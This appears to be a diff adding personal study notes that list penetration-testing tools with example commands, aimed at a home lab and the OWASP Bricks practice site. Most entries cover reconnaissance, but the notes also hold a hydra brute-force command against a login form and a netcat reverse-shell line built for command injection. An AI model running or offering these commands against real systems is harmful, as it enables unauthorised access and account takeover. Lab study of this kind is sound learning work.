@@ -1,0 +1,15 @@
+
+Programs
+
+- macchanger : used to change mac address of selected device
+- nikto (footprinting) : scans for a website and prints any vulnerabilities  (i.e. nikto -h xx.xx.xx.xx -p 80 -o myFile -F txt)
+- whois : busca informacion sobre una pagina/IP (i.e. whois cnn.com > result.txt)
+- theHarvester : searchs engine for emails (i.e. theHarvester -d DOMAIN -l 500 -b ENGINE)
+- Shodan : searches vulnerabilities 
+- dig : searches information about a domain
+- dnsenum : search informations about domain 
+- curl ipinfo.io/ip_to_search : search information about an IP
+- whatweb : searches languages and information about a website/ip
+- dirb : scan for directories that arent found on the page (dirb http://192.168.56.101 /usr/share/wordlists/dirb/common.txt)
+- hydra : brute force passwords (hydra 192.168.56.101 http-form-post "/owaspbricks/login-3/index.php:username=^USER^&passwd=^PASS^&submit=submit:Wrong user name or password." -L /home/kvx/Desktop/users.txt -P /home/kvx/Desktop/passwords.txt)
+- netcat : connect to other pc in network => ;nc.traditional -e /bin/bash 192.168.56.102 12345 / nc -lvp 12345 => execute in local machine
